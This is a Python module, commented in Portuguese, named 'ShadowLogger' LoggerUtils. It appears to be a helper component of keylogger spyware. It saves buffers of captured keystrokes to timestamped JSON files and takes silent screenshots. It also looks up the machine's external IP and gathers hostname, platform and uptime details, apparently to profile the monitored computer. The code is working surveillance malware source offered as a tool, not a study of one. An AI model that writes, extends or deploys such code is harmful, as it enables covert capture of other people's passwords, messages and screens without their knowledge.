#!/usr/bin/env python3
"""
LoggerUtils Module - ShadowLogger
Utilitários para logging, screenshots, e contexto do sistema.
"""

import os
import socket
import json
import logging
from datetime import datetime
from pathlib import Path

try:
    from PIL import Image, ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False


class LoggerUtils:
    def __init__(self, config):
        self.config = config
        self.log_dir = Path(config.get("log_dir", "logs"))
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Configura logging
        self.logger = logging.getLogger("logger_utils")
        self.logger.setLevel(logging.INFO)
        
        # File handler
        log_file = self.log_dir / "shadowlogger.log"
        file_handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

    def log_event(self, message):
        """Registra um evento no log."""
        timestamp = datetime.now().isoformat()
        log_entry = f"{timestamp} - {message}"
        self.logger.info(log_entry)
        
        # Salva em arquivo separado por data
        today = datetime.now().strftime("%Y-%m-%d")
        daily_log = self.log_dir / f"{today}.log"
        with open(daily_log, "a") as f:
            f.write(f"{log_entry}\n")

    def save_buffer(self, buffer):
        """Salva o buffer de teclas em arquivo."""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        buffer_file = self.log_dir / f"buffer_{timestamp}.json"
        
        data = {
            "timestamp": datetime.now().isoformat(),
            "buffer": "".join(buffer),
            "length": len(buffer)
        }
        
        with open(buffer_file, "w") as f:
            json.dump(data, f, indent=2)
        
        self.log_event(f"Buffer salvo ({len(buffer)} teclas): {buffer_file}")

    def get_ip(self):
        """Obtém o IP externo da máquina."""
        try:
            # Tenta obter IP externo via API
            import urllib.request
            with urllib.request.urlopen("https://api.ipify.org") as response:
                return response.read().decode()
        except Exception as e:
            self.log_event(f"Erro ao obter IP externo: {e}")
            return self._get_local_ip()

    def _get_local_ip(self):
        """Obtém o IP local da máquina."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            self.log_event(f"Erro ao obter IP local: {e}")
            return "127.0.0.1"

    def take_screenshot(self):
        """Captura um screenshot da tela."""
        if not HAS_PIL:
            self.log_event("PIL não disponível - pulando screenshot")
            return None
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            screenshot = ImageGrab.grab()
            
            # Salva screenshot
            screenshot_file = self.log_dir / f"screenshot_{timestamp}.png"
            screenshot.save(screenshot_file, "PNG")
            
            self.log_event(f"Screenshot salvo: {screenshot_file}")
            return str(screenshot_file)
            
        except Exception as e:
            self.log_event(f"Erro ao capturar screenshot: {e}")
            return None

    def get_system_info(self):
        """Obtém informações do sistema."""
        info = {
            "hostname": os.uname().nodename if hasattr(os, "uname") else os.getenv("COMPUTERNAME"),
            "platform": os.name,
            "python_version": f"{os.sys.version_info.major}.{os.sys.version_info.minor}.{os.sys.version_info.micro}",
            "uptime": self._get_uptime()
        }
        
        if HAS_PSUTIL:
            info["cpu_percent"] = psutil.cpu_percent()
            info["memory_percent"] = psutil.virtual_memory().percent
            info["disk_percent"] = psutil.disk_usage("/").percent
        
        return info

    def _get_uptime(self):
        """Obtém uptime do sistema."""
        if HAS_PSUTIL:
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            return (datetime.now() - boot_time).total_seconds()
        return 0


if __name__ == "__main__":
    # Teste simples
    config = {
        "log_dir": "logs",
        "screenshot_interval": 300
    }
    
    logger_utils = LoggerUtils(config)
    
    # Testa funções
    logger_utils.log_event("Teste do LoggerUtils iniciado")
    logger_utils.log_event(f"IP: {logger_utils.get_ip()}")
    logger_utils.log_event(f"Sistema: {logger_utils.get_system_info()}")
    
    if HAS_PIL:
        logger_utils.take_screenshot()
    
    logger_utils.log_event("Teste concluído")
